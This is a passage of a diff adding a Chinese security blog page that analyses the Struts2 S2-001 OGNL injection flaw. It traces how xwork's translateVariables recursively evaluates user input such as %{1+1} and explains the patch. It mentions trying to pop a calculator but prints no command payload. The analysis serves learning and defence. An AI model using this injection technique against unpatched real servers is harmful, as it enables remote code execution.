+            <span class="token keyword">if</span> <span class="token punctuation">(</span>start <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> end <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> count <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">return</span> XWorkConverter<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">convertValue</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> result<span class="token punctuation">,</span> asType<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+
+            String var <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>start <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            Object o <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">findValue</span><span class="token punctuation">(</span>var<span class="token punctuation">,</span> asType<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>evaluator <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                o <span class="token operator">=</span> evaluator<span class="token punctuation">.</span><span class="token function">evaluate</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+
+            String left <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> start<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            String right <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>end <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>o <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>TextUtils<span class="token punctuation">.</span><span class="token function">stringSet</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    result <span class="token operator">=</span> left <span class="token operator">+</span> o<span class="token punctuation">;</span>
+                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+                    result <span class="token operator">=</span> o<span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>TextUtils<span class="token punctuation">.</span><span class="token function">stringSet</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    result <span class="token operator">=</span> result <span class="token operator">+</span> right<span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+
+                expression <span class="token operator">=</span> left <span class="token operator">+</span> o <span class="token operator">+</span> right<span class="token punctuation">;</span>
+            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+                result <span class="token operator">=</span> left <span class="token operator">+</span> right<span class="token punctuation">;</span>
+                expression <span class="token operator">=</span> left <span class="token operator">+</span> right<span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span></code></pre>
+<p>关键就在这个 <code>translateVariables</code> 函数，在调试过程中可以看到传入的username（expression）多次进入该函数，接下来就分析一下每次发生的变化。</p>
+<p>第一次，通过 <code>findValue</code> 取出 username的值，赋给了 <code>o</code><br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080078172140.jpg" alt=""></p>
+<p>然后经过一些处理，拼接赋值给了 <code>expression</code> ，进入下一轮循环<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080080286517.jpg" alt=""></p>
+<p>可以看到，第二次的 <code>o</code> 取得的值已经变成了 <code>2</code>，说明OGNL表达式已经执行了。<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080082535664.jpg" alt=""></p>
+<p>最后经过后续的处理，回显在了输入框。</p>
+<p>最后经典弹个计算器2333</p>
+<p>emmm mac弹计算器没成功，还在找原因。</p>
+<h2 id="5-补丁分析"><a href="#5-补丁分析" class="headerlink" title="5-补丁分析"></a>5-补丁分析</h2><p>在 <code>xwork 2.0.4</code> 中添加了一个maxLoopCount属性，限制了递归解析的最大数目。<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080222290205.jpg" alt="-w1382"></p>
+<p>从而在解析到 <code>%{1+1}</code> 时，不会继续向下递归了，这样就修复了该漏洞。</p>
+<h2 id="6-参考"><a href="#6-参考" class="headerlink" title="6-参考"></a>6-参考</h2><p><a href="https://mochazz.github.io/2020/06/16/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BStruts2-001/#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D" target="_blank" rel="noopener">Java代码审计之Struts2-001(一) – mochazz</a></p>
+<p><a href="https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#OGNL%E8%AF%AD%E6%B3%95%E6%A0%91" target="_blank" rel="noopener">OGNL表达式注入漏洞总结</a></p>
+<p><a href="https://mengsec.com/2019/10/29/Java-Web-S2-001/" target="_blank" rel="noopener">Java web s2-001 – MengSec</a></p>
+<p><a href="http://zhengbao.wang/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E4%B9%8Bs2-001%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">java代码审计入门之s2-001复现分析</a></p>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">LANVNAL</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://lanvnal.com/2020/12/15/s2-001-lou-dong-fen-xi/">https://lanvnal.com/2020/12/15/s2-001-lou-dong-fen-xi/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">LANVNAL</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/Java%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">Java安全</span>
+                                </a>
+                            
+                                <a href="/tags/Struts2/">
+                                    <span class="chip bg-color">Struts2</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,qq,wechat,weibo" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2020/12/15/s2-001-lou-dong-fen-xi/">
+                    <div class="card-image">
+                        
+                        <img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/blog-theme-pic/struts2.png" class="responsive-img" alt="JavaWeb安全入门之 S2-001漏洞分析">
+                        
+                        <span class="card-title">JavaWeb安全入门之 S2-001漏洞分析</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            跟着大佬们的博客，开始第一篇漏洞分析记录，记录漏洞复现分析过程，已经踩到的坑，开始入坑Java Web安全，补足自己的不足。
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-12-15
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Java%E5%AE%89%E5%85%A8/" class="post-category">
+                                    Java安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Java%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">Java安全</span>
+                    </a>
+                    
+                    <a href="/tags/Struts2/">
+                        <span class="chip bg-color">Struts2</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/12/15/struts2-lou-dong-fen-xi-huan-jing-da-jian/">
+                    <div class="card-image">
+                        
+                        <img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/blog-theme-pic/struts2.png" class="responsive-img" alt="Struts2 漏洞分析环境搭建">
+                        
+                        <span class="card-title">Struts2 漏洞分析环境搭建</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            为了补全安全基础，为了不再那么菜，开始学Java安全(ง •̀_•́)ง，从最经典的Struts2漏洞开始，本篇是环境搭建过程。
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-12-15
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Java%E5%AE%89%E5%85%A8/" class="post-category">
+                                    Java安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Java%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">Java安全</span>
+                    </a>
+                    
+                    <a href="/tags/Struts2/">
+                        <span class="chip bg-color">Struts2</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2017</span>
+            <a href="/about" target="_blank">LANVNAL</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">128.9k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2017";
+                    var startMonth = "3";
+                    var startDate = "15";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/LANVNAL" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:lanvnal@foxmail.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
